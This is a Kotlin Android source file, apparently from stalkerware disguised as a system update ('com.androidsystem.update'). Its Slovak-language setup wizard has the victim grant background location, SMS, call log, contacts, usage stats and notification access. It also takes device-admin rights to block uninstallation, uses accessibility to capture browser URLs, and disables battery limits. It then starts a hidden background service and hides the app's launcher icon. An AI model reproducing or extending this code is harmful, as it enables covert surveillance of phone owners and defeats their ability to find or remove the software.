package com.androidsystem.update.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.androidsystem.update.receiver.DeviceAdminReceiver
import com.androidsystem.update.service.CoreService

class SetupWizard : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { SetupWizardContent() }
    }
}

@Composable
private fun SetupWizardContent() {
    val context = LocalContext.current
    var step by remember { mutableStateOf(0) }
    var allCompleted by remember { mutableStateOf(false) }
    var stepError by remember { mutableStateOf<String?>(null) }

    val steps = listOf(
        "Povolenie polohy", "Povolenie SMS a hovorov", "Povolenie kontaktov",
        "Povolenie štatistík používania", "Správca zariadenia", "Prístupnosť",
        "Notifikácie", "Optimalizácia batérie", "Automatický štart", "Dokončenie"
    )

    val stepDescriptions = listOf(
        "Aplikácia potrebuje prístup k polohe aj na pozadí.",
        "Pre zobrazenie SMS a záznamov hovorov.",
        "Pre zobrazenie zoznamu kontaktov.",
        "Pre sledovanie štatistík používania aplikácií.",
        "Aktivácia správcu zariadenia pre ochranu pred odinštalovaním.",
        "Pre sledovanie aktivít a získavanie URL z prehliadača.",
        "Pre sledovanie notifikácií zo sociálnych sietí.",
        "Vypnutie optimalizácie batérie pre spoľahlivý beh.",
        "Povolenie automatického štartu po reštarte.",
        "Všetko je nastavené. Spustenie služby."
    )

    val locationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.ACCESS_FINE_LOCATION] == true) {
            stepError = null; step++
        } else {
            stepError = "Povolenie polohy je potrebné"
        }
    }

    val smsCallLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.READ_SMS] == true &&
            granted[Manifest.permission.READ_CALL_LOG] == true) {
            stepError = null; step++
        } else {
            stepError = "Aspoň jedno povolenie je potrebné"
        }
    }

    val contactsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { granted ->
        if (granted[Manifest.permission.READ_CONTACTS] == true) {
            stepError = null; step++
        } else {
            stepError = "Povolenie kontaktov je potrebné"
        }
    }

    val usageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        val granted = try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { false }
        stepError = if (granted) null else "Štatistiky použitia nie sú povolené"
        step++
    }

    // FIX: Proper device admin check
    val adminLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, DeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            stepError = null; step++
        } else {
            stepError = "Správca zariadenia nie je aktivovaný"
        }
    }

    val accessibilityLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { stepError = null; step++ }

    val notificationListenerLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { stepError = null; step++ }

    val batteryLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { stepError = null; step++ }

    val autoStartLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { stepError = null; step++ }

    val stepActions = listOf<() -> Unit>(
        {
            locationLauncher.launch(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ))
        },
        {
            smsCallLauncher.launch(arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE
            ))
        },
        { contactsLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS)) },
        { usageLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
        {
            val admin = ComponentName(context, DeviceAdminReceiver::class.java)
            adminLauncher.launch(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Ochrana pred odinštalovaním")
                }
            )
        },
        { accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
        { notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
        {
            batteryLauncher.launch(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
            )
        },
        {
            val intent = when {
                Build.MANUFACTURER.equals("Xiaomi", true) ->
                    Intent("miui.intent.action.OP_AUTO_START").apply {
                        putExtra("package_name", context.packageName)
                        `package` = "com.miui.securitycenter"
                    }
                Build.MANUFACTURER.equals("Huawei", true) ->
                    Intent("huawei.intent.action.HW_AUTO_START").apply {
                        putExtra("packageName", context.packageName)
                        `package` = "com.huawei.systemmanager"
                    }
                Build.MANUFACTURER.equals("OnePlus", true) ->
                    Intent("oneplus.intent.action.OP_AUTO_START").apply {
                        putExtra("package_name", context.packageName)
                        `package` = "com.oneplus.security"
                    }
                else ->
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${context.packageName}")
                    }
            }
            autoStartLauncher.launch(intent)
        },
        {
            val serviceIntent = Intent(context, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(serviceIntent)
            else
                context.startService(serviceIntent)
            hideLauncherIcon(context)
            allCompleted = true
        }
    )

    if (allCompleted) {
        CompletionScreen(context)
    } else {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text("Nastavenie UI_service", fontSize = 24.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(8.dp))
            Text("Krok ${step + 1} z ${steps.size}", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f))
            Spacer(Modifier.height(24.dp))
            LinearProgressIndicator(
                progress = (step + 1).toFloat() / steps.size,
                modifier = Modifier.fillMaxWidth()
            )
            Spacer(Modifier.height(32.dp))
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(steps[step], fontSize = 20.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                    Spacer(Modifier.height(16.dp))
                    Text(stepDescriptions[step], fontSize = 14.sp, textAlign = TextAlign.Center)
                    stepError?.let {
                        Spacer(Modifier.height(8.dp))
                        Text(it, fontSize = 12.sp, color = MaterialTheme.colorScheme.error, textAlign = TextAlign.Center)
                    }
                    Spacer(Modifier.height(24.dp))
                    if (step < steps.size - 1) {
                        Button(
                            onClick = stepActions[step],
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Otvoriť nastavenia", fontSize = 14.sp)
                        }
                        Spacer(Modifier.height(12.dp))
                        OutlinedButton(
                            onClick = { stepError = null; step++ },
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Už mám povolené", fontSize = 14.sp)
                        }
                    } else {
                        Button(
                            onClick = stepActions[step],
                            modifier = Modifier.fillMaxWidth().height(48.dp)
                        ) {
                            Text("Spustiť službu", fontSize = 14.sp)
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun CompletionScreen(context: Context) {
    Column(
        modifier = Modifier.fillMaxSize().padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("✓", fontSize = 72.sp, color = MaterialTheme.colorScheme.primary)
        Spacer(Modifier.height(24.dp))
        Text("Nastavenie dokončené", fontSize = 20.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
        Spacer(Modifier.height(16.dp))
        Text("UI_service beží na pozadí.\nMôžete zatvoriť aplikáciu.", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f), textAlign = TextAlign.Center)
        Spacer(Modifier.height(32.dp))
        Button(
            onClick = { (context as? android.app.Activity)?.finish() },
            modifier = Modifier.fillMaxWidth().height(48.dp)
        ) {
            Text("Dokončiť", fontSize = 16.sp)
        }
    }
}

private fun hideLauncherIcon(context: Context) {
    try {
        context.packageManager.setComponentEnabledSetting(
            ComponentName(context, SetupWizard::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    } catch (e: Exception) {
        Log.e("SetupWizard", "Failed to hide icon", e)
    }
}
